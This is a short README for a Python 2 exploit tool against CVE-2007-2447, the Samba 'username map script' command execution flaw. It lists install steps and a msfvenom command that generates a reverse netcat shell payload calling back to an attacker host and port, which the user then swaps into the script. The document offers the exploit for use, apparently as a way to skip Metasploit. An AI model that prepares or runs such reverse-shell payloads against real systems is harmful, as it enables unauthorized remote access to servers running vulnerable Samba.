# smb-usermap-destroyer
Smb Usermap Destoyer is a python2 exploit for 𝗖𝗩𝗘-𝟮𝟬𝟬𝟳-𝟮𝟰𝟰𝟳 ('𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲' 𝗺𝗮𝗽 𝘀𝗰𝗿𝗶𝗽𝘁 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗼𝗻).
I created my own python script to automate the attack and avoid the exploitation with msfconsole.

Before use the exploit install the following requirements:

➡ Install python2:
    apt install python

➡ Install pip:
    apt install python-pip (If you can't find python-pip package try donwload pip insytaller from: https://bootstrap.pypa.io/get-pip.py).

➡ Install with pip the pysmb implementation:
    pip install --user pysmb
        
Shellcode generation and configuration:

• Create your own Shellcode with your host and port:
    
𝗺𝘀𝗳𝘃𝗲𝗻𝗼𝗺 -𝗽 𝗰𝗺𝗱/𝘂𝗻𝗶𝘅/𝗿𝗲𝘃𝗲𝗿𝘀𝗲_𝗻𝗲𝘁𝗰𝗮𝘁 𝗟𝗛𝗢𝗦𝗧=𝟭𝟬.𝟭𝟬.𝟭𝟬.𝟯𝟬 𝗟𝗣𝗢𝗥𝗧=𝟭𝟯𝟯𝟳 -𝘃 𝘀𝗵𝗲𝗹𝗹𝗰𝗼𝗱𝗲 -𝗳 𝗽𝘆𝘁𝗵𝗼𝗻
    
• Then repllace the default.
